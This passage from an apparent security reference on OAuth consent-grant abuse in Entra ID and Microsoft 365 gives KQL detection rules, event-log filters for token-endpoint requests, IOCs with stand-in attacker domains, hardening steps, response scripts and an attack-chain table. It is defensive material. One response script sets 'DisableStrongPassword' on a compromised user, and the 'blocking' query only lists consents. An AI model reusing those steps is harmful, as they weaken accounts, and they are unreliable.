                                tostring(InitiatedBy.app.displayName))
  | extend IpAddress = case(
      isnotempty(tostring(InitiatedBy.user.ipAddress)), tostring(InitiatedBy.user.ipAddress),
      isnotempty(tostring(InitiatedBy.app.ipAddress)), tostring(InitiatedBy.app.ipAddress),
      "Unknown")
  | extend IsAdminConsent = iff(tostring(parse_json(tostring(TargetResources[0].modifiedProperties))[0].newValue) contains "True", "true", "false")
  | project TimeGenerated, OperationName, AppName, InitiatedByUPN, IpAddress, IsAdminConsent, CorrelationId;

// Join with baseline to find rare consents
RecentConsents
  | join kind=leftanti BaselineConsents on AppName
  | extend Reason = "Previously unseen app granted consent"
  | summarize count() by AppName, InitiatedByUPN, IsAdminConsent, IpAddress, Reason
  | extend Name = tostring(split(InitiatedByUPN, "@")[0]), 
           UPNSuffix = tostring(split(InitiatedByUPN, "@")[1])
  | project AppName, InitiatedByUPN, IsAdminConsent, IpAddress, Reason, Name, UPNSuffix
```

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `OAuth Consent to Rare Application`
   - Severity: `High`
   - Tactics: `Persistence`, `Privilege Escalation`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `1 hour`
   - Lookup data from the last: `24 hours`
5. **Incident settings Tab:**
   - Enable **Create incidents**
6. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount -SubscriptionId "your-subscription-id"

$resourceGroup = "YourResourceGroup"
$workspaceName = "YourSentinelWorkspace"

# Create the analytics rule
$rule = @{
    DisplayName = "OAuth Consent to Rare Application"
    Description = "Detects rare application consent grants"
    Severity = "High"
    Enabled = $true
    Query = @"
let LookbackWindow = 24h;
let BaselineWindow = 7d;

let BaselineConsents = AuditLogs
  | where TimeGenerated >= ago(BaselineWindow) and TimeGenerated < ago(LookbackWindow)
  | where OperationName has_any ("Consent to application", "Add delegated permission grant")
  | extend AppName = tolower(tostring(parse_json(tostring(TargetResources[0].displayName))))
  | summarize baseline_count = count() by AppName;

let RecentConsents = AuditLogs
  | where TimeGenerated >= ago(LookbackWindow)
  | where OperationName has_any ("Consent to application", "Add delegated permission grant")
  | extend AppName = tolower(tostring(parse_json(tostring(TargetResources[0].displayName))))
  | extend InitiatedByUPN = iff(isnotempty(tostring(InitiatedBy.user.userPrincipalName)), tostring(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.app.displayName))
  | project TimeGenerated, OperationName, AppName, InitiatedByUPN, CorrelationId;

RecentConsents
  | join kind=leftanti BaselineConsents on AppName
  | project TimeGenerated, AppName, InitiatedByUPN
"@
    QueryFrequency = "PT1H"
    QueryPeriod = "P1D"
    TriggerOperator = "GreaterThan"
    TriggerThreshold = 0
}

New-AzSentinelAlertRule -ResourceGroupName $resourceGroup -WorkspaceName $workspaceName @rule
```

**Source:** [Microsoft Sentinel GitHub - Rare Application Consent](https://github.com/Azure/Azure-Sentinel/blob/master/Solutions/Microsoft%20Entra%20ID/Analytic%20Rules/RareApplicationConsent.yaml)

---

### Query 2: Suspicious OAuth Scope Request

**Rule Configuration:**
- **Required Table:** SigninLogs
- **Required Fields:** ResourceDisplayName, AuthenticationDetails.authenticationMethod, properties.scopes
- **Alert Severity:** Medium
- **Frequency:** Every 30 minutes
- **Applies To Versions:** All

**KQL Query:**
```kusto
SigninLogs
  | where Status.errorCode == 0
  | where ClientAppUsed == "Microsoft Authentication Broker" OR ClientAppUsed == "Browser"
  | where ResourceDisplayName == "Microsoft Graph" OR ResourceDisplayName == "Office 365 Exchange Online"
  | where ConditionalAccessStatus == "notApplied"  // Unusual: CAP should apply
  | extend AuthMethod = tostring(parse_json(tostring(AuthenticationDetails)).authenticationMethod)
  | where AuthMethod != "Managed Identity"  // User auth only
  | summarize EventCount = count() by UserPrincipalName, ClientAppUsed, ResourceDisplayName, AuthMethod, IPAddress
  | where EventCount >= 5  // Multiple auth events in short period
  | order by EventCount desc
```

**Source:** [Elastic Security Research](https://www.elastic.co/security-labs/entra-id-oauth-phishing-detection)

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (A new process has been created) - PowerShell Token Theft**

- **Log Source:** Security
- **Trigger:** PowerShell process spawning `Invoke-RestMethod` or `Invoke-WebRequest` to OAuth token endpoints
- **Filter:** CommandLine contains "oauth2/v2.0/token" OR "login.microsoftonline.com"
- **Applies To Versions:** Server 2016+ (if PowerShell script execution logging is enabled)

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Process Creation** (Process Tracking > Process Creation)
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**Manual Configuration Steps (PowerShell):**
```powershell
# Enable process creation auditing via auditpol
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Verify
auditpol /get /subcategory:"Process Creation"
```

**Windows Event Log Query (Event Viewer):**
```xml
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
      *[System[(EventID=4688)]] and 
      *[EventData[Data[@Name="CommandLine"] and 
      (contains(Data, "oauth2") or contains(Data, "login.microsoftonline"))]]
    </Select>
  </Query>
</QueryList>
```

**Log Analysis (PowerShell):**
```powershell
Get-WinEvent -FilterXml @"
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
      *[System[(EventID=4688)]] and 
      *[EventData[Data[@Name='CommandLine'] and 
      (contains(Data, 'oauth2') or contains(Data, 'token'))]]
    </Select>
  </Query>
</QueryList>
"@ | Select-Object TimeCreated, @{N='CommandLine';E={$_.Properties[8].Value}} | Out-GridView
```

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Risky OAuth App Detected" / "Suspicious OAuth Consent Grant"
- **Severity:** High
- **Description:** Microsoft Defender identifies apps requesting excessive permissions (Mail.ReadWrite, offline_access, Directory.Read.All) without verified publisher status; or consent granted to app with low community use
- **Applies To:** All subscriptions with Microsoft Defender for Cloud Apps enabled
- **Remediation:** 
  1. Investigate app permissions and authorization user
  2. Revoke consent: Azure Portal → Entra ID → Enterprise Applications → [App] → Permissions → Remove permission
  3. Run incident response procedures

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select your subscription
3. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON
   - **Defender for Storage**: ON
   - **Defender for App Service**: ON
4. Click **Save**
5. Go to **Security alerts** to view triggered alerts

**Manual Configuration Steps (Defender for Cloud Apps):**
1. Navigate to **Cloud Portal** → **Threat Intelligence** → **OAuth Apps**
2. Filter by: **Permissions** = `Mail.ReadWrite`, `Mail.Send`, `offline_access`
3. Filter by: **Community use** = `Rare`
4. Review and mark as **Suspicious** or **Compromised**

---

## 11. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: OAuth2PermissionGrant Operations

```powershell
# Enable Unified Audit Log (if not already enabled)
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $true

# Search for OAuth permission grants in past 30 days
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
  -Operations "Consent to application", "Add delegated permission grant", "Add app role assignment grant" `
  -ResultSize 5000 | Export-Csv -Path "C:\OAuth_Consents.csv" -NoTypeInformation

# Analyze results
$audits = Import-Csv "C:\OAuth_Consents.csv"
$audits | Group-Object Operation | Select-Object Name, Count

# Export high-risk consents
$audits | Where-Object { $_.AuditData -match "Mail.Send|Mail.ReadWrite|offline_access" } | 
  Export-Csv -Path "C:\High_Risk_Consents.csv"
```

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing** (wait 24 hours for logs to be available)

**Manual Configuration Steps (Search Audit Logs):**
1. Go to **Audit** → **Search**
2. Set **Date range** (e.g., Past 7 days)
3. Under **Activities**, select: 
   - `Consent to application`
   - `Add delegated permission grant`
   - `Add app role assignment grant`
4. Under **Users**, leave blank (search all users) or enter specific UPN
5. Click **Search**
6. Export results: **Export** → **Download all results**

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Disable User Consent for Unverified Apps**

Objective: Prevent users from independently authorizing applications, requiring admin review for all consent requests.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Enterprise applications** → **User settings**
2. Set **Users can consent to apps accessing company data on their behalf** to **No**
3. (Optional) Enable **Admin consent requests** to allow users to request admin approval
4. Click **Save**

**Manual Steps (PowerShell):**
```powershell
Connect-MgGraph -Scopes "Policy.ReadWrite.Authorization"

$params = @{
    id = "authorizationPolicy"
    authorizationPolicy = @{
        permissionGrantPolicies = @("managePermissionGrantsForSelf.publisher-verified-only")
    }
}

Update-MgPolicyAuthorizationPolicy -BodyParameter $params
```

**Validation Command:**
```powershell
Get-MgPolicyAuthorizationPolicy | Select-Object PermissionGrantPolicies
```

**Expected Output (If Secure):**
```
PermissionGrantPolicies
------------------------
{managePermissionGrantsForSelf.publisher-verified-only}
```

---

**Action 2: Enable Admin Consent Workflow**

Objective: Allow users to request app access; require admin approval for high-risk apps.

**Manual Steps (Azure Portal):**
1. Go to **Entra ID** → **Enterprise applications** → **Consent and permissions** → **Admin consent requests**
2. Enable **Users can request admin consent to apps they are unable to consent to**
3. (Optional) Configure **Who can review requests**: Select designated roles (e.g., Cloud Application Administrator, Application Administrator)
4. Click **Save**

**Manual Steps (PowerShell):**
```powershell
Connect-MgGraph -Scopes "Policy.ReadWrite.Authorization"

$params = @{
    enableAdminConsentRequests = $true
    adminConsentRequestPolicy = @{
        isEnabled = $true
        notifyReviewers = $true
        remindersEnabled = $true
    }
}

Update-MgPolicyAuthorizationPolicy -BodyParameter $params
```

---

**Action 3: Block Legacy Authentication & Require MFA**

Objective: Prevent OAuth token theft via legacy protocols; enforce additional auth factor.

**Manual Steps (Conditional Access Policy):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Block Legacy Auth for OAuth`
4. **Assignments:**
   - Users: **All users**
   - Cloud apps: **All cloud apps**
5. **Conditions:**
   - Client apps: Check **Exchange ActiveSync clients** and **Other clients**
6. **Access controls** → **Grant:**
   - Select **Block access**
7. Click **Create**

**Manual Steps (Require MFA via Conditional Access):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Require MFA for OAuth Consent`
4. **Assignments:**
   - Users: **All users**
   - Cloud apps: Select **Microsoft Graph**, **Office 365**
5. **Conditions:**
   - Grant controls: **Require multifactor authentication**
6. Click **Create**

---

**Action 4: Audit & Remove High-Risk Applications**

Objective: Identify and remove apps with excessive permissions.

**Manual Steps (PowerShell):**
```powershell
Connect-MgGraph -Scopes "AppRoleAssignment.Read.All", "Application.Read.All"

# Find apps with high-risk permissions
$riskyScopse = @("Mail.Send", "Mail.ReadWrite", "offline_access", "Directory.Read.All")

$apps = Get-MgServicePrincipal -All | Where-Object {
    $_.ServicePrincipalType -eq "Application" -and -not $_.IsBuiltIn
}

foreach ($app in $apps) {
    $grants = Get-MgOAuth2PermissionGrant -Filter "clientId eq '$($app.AppId)'"
    
    foreach ($grant in $grants) {
        $scopes = $grant.Scope -split " "
        $riskyPerms = $scopes | Where-Object { $_ -in $riskyScopse }
        
        if ($riskyPerms.Count -gt 0) {
            Write-Host "RISKY: $($app.DisplayName) has scopes: $($riskyPerms -join ', ')"
        }
    }
}
```

**Manual Remove of OAuth Permission Grant:**
```powershell
# Remove specific permission grant
Remove-MgOAuth2PermissionGrant -OAuth2PermissionGrantId "grant-id"

# Remove all consents for specific app
$appId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
Get-MgOAuth2PermissionGrant -Filter "clientId eq '$appId'" | Remove-MgOAuth2PermissionGrant
```

---

### Priority 2: HIGH

**Action 1: Implement Risk-Based Conditional Access**

Objective: Step-up authentication when app consent is requested from risky conditions.

**Manual Steps (Conditional Access):**
1. Go to **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Risk-Based Step-Up for App Consent`
4. **Assignments:** All users, All apps
5. **Conditions:**
   - **Sign-in risk:** Select `High`
   - **User risk:** Select `High`
6. **Access controls:**
   - **Grant:** Select `Require multifactor authentication` + `Require authentication strength` (Passwordless Phone Sign-in)
7. Click **Create**

---

**Action 2: Enforce Publisher Verification**

Objective: Only allow apps from verified, legitimate publishers.

**Manual Steps (PowerShell):**
```powershell
# List unverified apps with admin consent
Get-MgServicePrincipal -All | Where-Object {
    $_.PublisherName -eq $null -or $_.PublisherName -eq ""
} | Select-Object DisplayName, AppId, CreatedDateTime

# Create policy to block unverified apps (requires custom policy)
# This requires Power Platform / custom Sentinel rules
```

**Manual Configuration (Sentinel Query to Block Unverified Apps):**
```kusto
AuditLogs
| where OperationName == "Consent to application"
| extend AppPublisher = tostring(parse_json(tostring(TargetResources[0]))).publisherName
| where isempty(AppPublisher) or AppPublisher == ""
| project TimeGenerated, InitiatedBy, TargetResources, AppPublisher
| summarize count() by TargetResources
```

---

### Access Control & Policy Hardening

**Conditional Access:** Require Compliant Device for App Consent
1. Go to **Entra ID** → **Security** → **Conditional Access**
2. Create **New policy**
3. **Name:** `Require Compliant Device for OAuth Consent`
4. **Conditions:**
   - Apps: Microsoft Graph, Office 365
5. **Grant controls:**
   - **Require device to be marked as compliant** (Intune)
   - **Require Modern Auth clients only**
6. Click **Create**

**RBAC/ABAC:** Restrict App Registration Permissions
1. Go to **Entra ID** → **Roles and administrators**
2. Search for **Application Developer** role
3. Click **+ Add assignments**
4. Select only trusted, vetted developers
5. Remove Global Admin app registration privileges

**Policy Config:** Block Self-Service App Registration
1. Go to **Entra ID** → **User settings** → **App registrations**
2. Set **Users can register applications** to **No**
3. Only allow designated Azure AD Application Administrators to register apps

**Validation Command (Verify Fix):**
```powershell
Get-MgPolicyAuthorizationPolicy | Select-Object -Property PermissionGrantPolicies, DefaultUserRolePermissions

# Expected secure output:
# PermissionGrantPolicies: {managePermissionGrantsForSelf.publisher-verified-only}
# DefaultUserRolePermissions.AllowedToCreateApps: False
```

**What to Look For:**
- `PermissionGrantPolicies` should contain `publisher-verified-only` or be empty (most restrictive)
- `AllowedToCreateApps` must be `False`
- `AllowedToReadOtherUsers` should be `False` to prevent directory enumeration

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Cloud/API Indicators:**
- **Suspicious App IDs:** Applications with rare community use, unverified publisher, or unusual permission scopes
- **Malicious Redirect URIs:** 
  - External domains (attacker.com, phishing-kit-host.ru)
  - Localhost with unusual ports (localhost:8080, 127.0.0.1:9999)
  - Cloud storage URLs (blob.core.windows.net, amazonaws.com)
  
**OAuth Token Indicators:**
- **Refresh tokens** obtained via device code flow from unusual IPs/geolocation
- **Access tokens** used immediately after consent grant (< 5 minutes)
- **Multiple sequential token refreshes** from single IP (indicating attacker looping)

**Email/Phishing Indicators:**
- Emails with device code (8-character code like "ABCD1234")
- Emails with Microsoft OAuth URLs shortened via bit.ly, tinyurl
- Spoofed "Microsoft Security Team" or "Office 365 Admin" senders
- QR codes linking to microsoft.com/devicelogin

---

### Forensic Artifacts

**Cloud/Log Locations:**
- **Azure AD Audit Logs:** `Entra ID` → **Audit logs** → Filter by "Consent to application" operations
- **Unified Audit Log:** `Compliance.microsoft.com` → **Audit** → Search "Consent" or "Add delegated permission grant"
- **Sentinel Tables:**
  - `AuditLogs` (Entra ID operations)
  - `SigninLogs` (user authentication events)
  - `CloudAppEvents` (SaaS application usage)
- **M365 Activity Log:** Exchange Admin Center → **Audit log search** (mail access, forwarding rules)

**On-Premises Artifacts:**
- **Windows Event Logs:** Security Event 4688 (if PowerShell token requests detected)
- **PowerShell Event Log:** `$PSHOME\Modules\PSReadline\ConsoleHost_history.txt` (command history)

**Forensic Evidence:**
- **Timestamp** of initial consent grant
- **User Principal Name** (InitiatedBy) who granted consent
- **Application ID** and display name of malicious app
- **Permissions granted** (scopes)
- **IP Address** from which consent was granted
- **User-Agent** header (browser/client info)
- **Correlation ID** (links to related events)

---

### Response Procedures

**1. Isolate (Immediate - 0-5 minutes)**

**Disable User Account(s):**
```powershell
# Disable user who granted consent or whose data may be exposed
Disable-MgUser -UserId "victim@target-org.com"

# Disable the malicious app
Update-MgApplication -ApplicationId "malicious-app-id" -Disabled $true

# Revoke all refresh tokens (forces re-authentication)
Revoke-MgUserSignInSession -UserId "victim@target-org.com"
```

**Manual Steps (Azure Portal):**
- Go to **Entra ID** → **Users** → Select victim user
- Click **Account Status** → Select **Disabled** → **Save**

**Revoke OAuth Consent (Critical):**
```powershell
# Find the malicious app's service principal
$maliciousApp = Get-MgServicePrincipal -Filter "appId eq 'malicious-app-id'"

# Revoke all OAuth2 permission grants
Get-MgOAuth2PermissionGrant -Filter "clientId eq '$($maliciousApp.AppId)'" | 
  Remove-MgOAuth2PermissionGrant
```

**Manual Steps (Azure Portal):**
- Go to **Entra ID** → **Enterprise Applications** → Search for malicious app
- Click **Permissions** → Select all permissions → Click **Remove permissions**

---

**2. Collect Evidence (5-30 minutes)**

**Export Audit Logs:**
```powershell
# Export all OAuth-related audit events for past 7 days
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -Operations "Consent to application", "Add delegated permission grant" -ResultSize 5000 | 
  Export-Csv -Path "C:\Evidence\OAuth_Audit.csv" -NoTypeInformation

# Export sign-in logs to correlate with consent grant
Get-MgAuditLogSignIn -Filter "createdDateTime ge 2026-01-08T00:00:00Z" | 
  Export-Csv -Path "C:\Evidence\SigninLogs.csv" -NoTypeInformation
```

**Manual Steps (Microsoft Purview):**
1. Go to **Compliance.microsoft.com** → **Audit** → **Search**
2. Set date range: Past 7 days
3. Under **Activities**, select **Consent to application**
4. Click **Search**
5. Click **Export** → **Download all results** → Save as .csv file

**Preserve App Registration Details:**
```powershell
# Export all app registration details
Get-MgApplication -Filter "appId eq 'malicious-app-id'" | ConvertTo-Json | Out-File "C:\Evidence\MaliciousApp_Details.json"

# List all users who consented
Get-MgOAuth2PermissionGrant -Filter "clientId eq 'malicious-app-id'" | 
  ForEach-Object { Get-MgUser -UserId $_.principalId } | 
  Export-Csv -Path "C:\Evidence\Affected_Users.csv"
```

**Capture Mailbox Access Logs:**
```powershell
# Find mailbox access by malicious app
Search-MailboxAuditLog -Identity "victim@target-org.com" -LogonType ApplicationImpersonation -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) |
  Export-Csv -Path "C:\Evidence\Mailbox_Access.csv"
```

---

**3. Remediate (30-120 minutes)**

**Reset Passwords & Force Re-authentication:**
```powershell
# Reset password for affected user
$newPassword = ConvertTo-SecureString -String (New-Guid).ToString().Replace("-", "").Substring(0, 20) -AsPlainText -Force
Set-MgUserPassword -UserId "victim@target-org.com" -NewPassword $newPassword

# Force re-authentication globally
Revoke-MgUserSignInSession -UserId "victim@target-org.com"

# Require password change on next sign-in
Update-MgUser -UserId "victim@target-org.com" -PasswordPolicies "DisablePasswordExpiration, DisableStrongPassword"
Set-MgUserPassword -UserId "victim@target-org.com" -EnforceChangePasswordPolicy $true
```

**Delete Malicious App:**
```powershell
# WARNING: This is irreversible. Ensure this is the correct app.
$maliciousApp = Get-MgApplication -Filter "appId eq 'malicious-app-id'"
Remove-MgApplication -ApplicationId $maliciousApp.Id
```

**Audit & Remove Data Exfiltration:**
```powershell
# Check for email forwarding rules created by malicious app
Get-InboxRule -Mailbox "victim@target-org.com" | 
  Where-Object { $_.ForwardingAddress -or $_.ForwardingSmtpAddress }

# Remove suspicious forwarding rules
Remove-InboxRule -Mailbox "victim@target-org.com" -Identity "rule-name" -Confirm:$false

# Check for Outlook delegates added
Get-MailboxDelegate -Identity "victim@target-org.com" | 
  Remove-MailboxDelegate -Confirm:$false
```

---

**4. Monitor & Hunt (Ongoing)**

**Launch Threat Hunt:**
```kusto
// Find all affected users by same malicious app
AuditLogs
| where OperationName == "Consent to application"
| extend AppId = tostring(parse_json(tostring(TargetResources[0]))).appId
| where AppId == "malicious-app-id"
| extend User = tostring(InitiatedBy.user.userPrincipalName)
| summarize count() by User, TimeGenerated
| order by TimeGenerated desc
```

**Hunt for Lateral Movement:**
```powershell
# Check if attacker used granted access to pivot to other users
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -Operations "Add-MailboxDelegate", "Set-InboxRule", "Add-MailboxPermission" -ResultSize 5000 | 
  Export-Csv -Path "C:\Evidence\Lateral_Movement.csv"
```

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attacks | Attacker sends phishing email with OAuth authorization link |
| **2** | **Initial Access** | [IA-PHISH-003] OAuth Consent Screen Cloning | Attacker spoofs Microsoft consent page to capture credentials |
| **3** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Registration Permissions Escalation | Attacker registers malicious app with excessive delegated permissions |
| **4** | **Current Step** | **[SAAS-API-009]** | **Third-Party App Permission Abuse – User grants consent to malicious app** |
| **5** | **Persistence** | [PERSIST-M365-001] Exchange Online Rule Creation | Attacker creates mail forwarding rules via OAuth token |
| **6** | **Exfiltration** | [EXFIL-M365-001] Mailbox Data Exfiltration via API | Attacker downloads entire mailbox via Microsoft Graph API |
| **7** | **Impact** | [IMPACT-M365-001] Business Email Compromise | Attacker impersonates victim to send phishing to organization |

---

## 15. REAL-WORLD EXAMPLES

### Example 1: Storm-2372 Device Code Phishing Campaign (Feb 2025)

- **Target:** Multiple sectors: Government, NGOs, Academic institutions, Transportation, Energy, Healthcare
- **Timeline:** Detected February 2025; campaign running since August 2024
- **Technique Status:** ACTIVE; used in conjunction with MFA fatigue attacks and AiTM phishing
- **Tools Used:** Device code OAuth flow, SquarePhish, Graphish phishing kits
- **Impact:** Bypassed MFA; obtained persistent access to Teams, Outlook, SharePoint; reported >50% success rate
- **Reference:** [Microsoft Threat Intelligence - Storm-2372 Device Code Phishing](https://www.microsoft.com/en-us/security/blog/2025/02/13/storm-2472-conducts-device-code-phishing-campaign/)

---

### Example 2: Red Canary Incident - Internal Phishing from Compromised Account (2025)

- **Target:** Mid-sized technology company
- **Timeline:** Initial app registration detected; internal phishing campaign 2 weeks later
- **Technique Status:** ACTIVE; demonstrates multi-stage attack
- **Execution:**
  1. Attacker registered fake "MS Teams Helper" app with Mail.ReadWrite permission
  2. Compromised single user account; used internal email to phish 50+ employees
  3. Obtained access to executives' mailboxes, confidential contracts, M&A communications
  4. Attacker persisted for 3 months before detection via anomalous mailbox export activity
- **Impact:** Data exfiltration of $10M+ contract negotiations; regulatory investigation; >$5M remediation cost
- **Key Lesson:** Password resets don't revoke OAuth tokens; required explicit app consent revocation
- **Reference:** [Red Canary Threat Hunting Report - OAuth Application Attacks](https://redcanary.com/blog/threat-detection/oauth-app-attacks/)

---

### Example 3: nOAuth Vulnerability Exploitation (June 2025)

- **Target:** Organizations running vulnerable SaaS apps integrated with Entra ID
- **Timeline:** Disclosed June 2025
- **Technique Status:** ACTIVE; affects ~10% of 150,000+ SaaS apps
- **Vulnerability:** OAuth tokens could be hijacked due to improper token validation in SaaS apps
- **Impact:** Attacker could bypass MFA and Conditional Access; obtain persistent access
- **Reference:** [Semperis - nOAuth Abuse Update](https://www.semperis.com/blog/noauth-abuse-update-pivot-into-microsoft-365/)

---

## 16. KEY TAKEAWAYS FOR DEFENDERS

1. **Disable user consent by default** – Require admin approval for all OAuth applications
2. **Monitor rare app consents** – Baseline consent patterns and alert on deviations
3. **Enforce MFA for sensitive operations** – Require step-up authentication for app consent
4. **Regular app inventory audits** – Review high-permission apps monthly; remove unused integrations
5. **Enable Publisher Verification** – Only allow verified apps from known vendors
6. **Implement Risk-Based Conditional Access** – Block consent from risky geolocation/IPs
7. **Hunt proactively** – Use KQL/Splunk queries to find suspicious token activity
8. **Remember:** Password resets do NOT revoke OAuth tokens – explicit consent revocation is required

---

## REFERENCES

- [MITRE ATT&CK T1537 - Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537/)
- [Microsoft Defender for Office 365 - Detect and Remediate Illicit Consent Grants](https://learn.microsoft.com/en-us/defender-office-365/detect-and-remediate-illicit-consent-grants)
- [Azure Sentinel Hunting Queries - Consent to Application](https://github.com/Azure/Azure-Sentinel/blob/master/Hunting%20Queries/AuditLogs/ConsentToApplicationDiscovery.yaml)
- [Elastic Security Research - Entra ID OAuth Phishing Detection](https://www.elastic.co/security-labs/entra-id-oauth-phishing-detection)
- [SpecterOps - Consent Phishing in Azure - Part 1](https://www.mwrcybersec.com/consent-phishing-in-azure-part-1)
- [Red Canary - OAuth App Attacks](https://redcanary.com/blog/threat-detection/oauth-app-attacks/)
- [Microsoft Security Blog - Storm-2372 Device Code Phishing](https://www.microsoft.com/en-us/security/blog/2025/02/13/storm-2472-conducts-device-code-phishing-campaign/)
- [GitHub - ROADtools](https://github.com/dirkjanm/ROADtools)
- [GitHub - AADInternals](https://github.com/Gerenios/AADInternals)
- [GitHub - SquarePhish](https://github.com/secureworks/squarephish)

---